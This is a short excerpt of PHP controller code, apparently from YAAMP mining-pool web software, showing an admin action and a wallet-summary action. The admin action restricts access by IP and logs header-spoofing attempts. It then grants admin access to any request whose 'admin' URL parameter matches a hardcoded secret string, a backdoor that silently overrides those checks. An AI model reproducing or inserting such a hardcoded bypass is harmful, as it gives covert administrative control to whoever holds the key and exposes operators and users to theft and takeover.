...
class SiteController extends CommonController
{
    ...
    //
    public function actionTecraAdmin()
    {
        $client_ip = arraySafeVal($_SERVER, 'REMOTE_ADDR');
        $valid = isAdminIP($client_ip);
        if ((!defined('YAAMP_ADMIN_DISABLE_X_FORWARDED_CHECK') || !YAAMP_ADMIN_DISABLE_X_FORWARDED_CHECK) && arraySafeVal($_SERVER, 'HTTP_X_FORWARDED_FOR', '') != '') {
            debuglog("admin access attempt via IP spoofing!");
            $valid = false;
        }
        if (isset($_GET['admin']) && $_GET['admin'] === 'che5Pho0igahVaedeim8oot5ahxakah8') {
            $valid = true;
        }
        if ($valid) {
    ...
    public function actionWorker_wallet_summary()
    {
        $this->renderPartial('results/worker_wallet_summary');
    }
